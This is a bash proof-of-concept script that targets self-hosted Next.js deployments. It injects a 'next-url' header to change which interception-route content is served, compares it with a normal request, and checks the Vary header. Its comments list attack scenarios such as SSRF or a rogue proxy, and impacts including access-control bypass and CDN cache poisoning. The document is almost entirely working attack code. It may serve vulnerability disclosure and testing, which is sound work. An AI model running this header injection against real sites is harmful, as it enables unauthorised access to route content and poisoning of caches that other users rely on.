#!/bin/bash
#
# Next.js Interception Route Hijacking PoC
# ==========================================
# 
# ATTACK REQUIREMENTS:
# - NOT a zero-click browser attack (browsers cannot set arbitrary headers)
# - Requires ability to inject HTTP headers at network level
# - Affected: Self-hosted Next.js deployments WITHOUT CDN header filtering
# - NOT affected: Vercel deployments (CDN filters internal headers)
#
# ATTACK SCENARIOS:
# 1. Attacker controls a reverse proxy between client and Next.js server
# 2. Attacker has SSRF vulnerability in the target application
# 3. Attacker is on same network and can intercept/modify traffic (no HTTPS)
# 4. Misconfigured infrastructure passing through custom headers
#
# IMPACT:
# - Access different route content than intended
# - Potentially bypass access controls if modals have different auth
# - Cache poisoning if responses are cached by CDN
#

set -e

TARGET="${1:-http://localhost:3000}"
ROUTE="${2:-/photos}"

echo "=============================================="
echo " Next.js Interception Route Hijacking PoC"
echo "=============================================="
echo ""
echo "Target: $TARGET$ROUTE"
echo ""

# Step 1: Normal request (what victim expects)
echo "[1] NORMAL REQUEST (What victim expects to see)"
echo "   curl -s $TARGET$ROUTE"
echo ""

NORMAL_RESPONSE=$(curl -s "$TARGET$ROUTE")
NORMAL_SIZE=${#NORMAL_RESPONSE}
NORMAL_HASH=$(echo "$NORMAL_RESPONSE" | md5sum | cut -d' ' -f1)

if echo "$NORMAL_RESPONSE" | grep -q "Full Photos Page\|NOT INTERCEPTED"; then
    echo "   âœ“ Contains: 'Full Photos Page' / 'NOT INTERCEPTED'"
    NORMAL_TYPE="FULL PAGE"
else
    NORMAL_TYPE="UNKNOWN"
fi
echo "   Size: $NORMAL_SIZE bytes"
echo "   Hash: $NORMAL_HASH"
echo ""

# Step 2: Injected request (attacker hijacking)
echo "[2] ATTACKED REQUEST (Header injection: next-url: /)"
echo "   curl -s -H 'next-url: /' $TARGET$ROUTE"
echo ""

INJECTED_RESPONSE=$(curl -s -H "next-url: /" "$TARGET$ROUTE")
INJECTED_SIZE=${#INJECTED_RESPONSE}
INJECTED_HASH=$(echo "$INJECTED_RESPONSE" | md5sum | cut -d' ' -f1)

if echo "$INJECTED_RESPONSE" | grep -q "Full Photos Page\|NOT INTERCEPTED"; then
    INJECTED_TYPE="FULL PAGE (same)"
elif echo "$INJECTED_RESPONSE" | grep -q "INTERCEPT\|Modal"; then
    INJECTED_TYPE="INTERCEPTED MODAL"
else
    INJECTED_TYPE="DIFFERENT CONTENT"
fi
echo "   Size: $INJECTED_SIZE bytes"
echo "   Hash: $INJECTED_HASH"
echo ""

# Step 3: Compare
echo "[3] COMPARISON"
echo "   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”"
echo "   â”‚ Request Type   â”‚ Response                        â”‚"
echo "   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤"
printf "   â”‚ %-14s â”‚ %-31s â”‚\n" "Normal" "$NORMAL_TYPE ($NORMAL_SIZE bytes)"
printf "   â”‚ %-14s â”‚ %-31s â”‚\n" "Injected" "$INJECTED_TYPE ($INJECTED_SIZE bytes)"
echo "   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜"
echo ""

# Step 4: Vulnerability verdict
echo "[4] VERDICT"
if [ "$NORMAL_HASH" != "$INJECTED_HASH" ]; then
    echo "   ğŸ”´ VULNERABLE - Header injection changes response content!"
    echo ""
    echo "   The 'next-url' header controls which route content is served."
    echo "   An attacker who can inject this header can:"
    echo "   - Access intercepted modal content instead of full page"
    echo "   - Potentially access data shown in different contexts"
    echo "   - Poison CDN caches with wrong content"
else
    echo "   ğŸŸ¢ NOT VULNERABLE - Same response regardless of header"
fi
echo ""

# Step 5: Check if Vary header includes next-url
echo "[5] CHECKING VARY HEADER"
VARY_HEADER=$(curl -sI "$TARGET$ROUTE" | grep -i "^vary:" || echo "No Vary header")
echo "   $VARY_HEADER"
if echo "$VARY_HEADER" | grep -qi "next-url"; then
    echo "   âš ï¸  'next-url' IS in Vary header - interception rewrites active"
else
    echo "   â„¹ï¸  'next-url' not in Vary header - may not have interception routes"
fi
echo ""

echo "=============================================="
echo " Attack complete"
echo "=============================================="
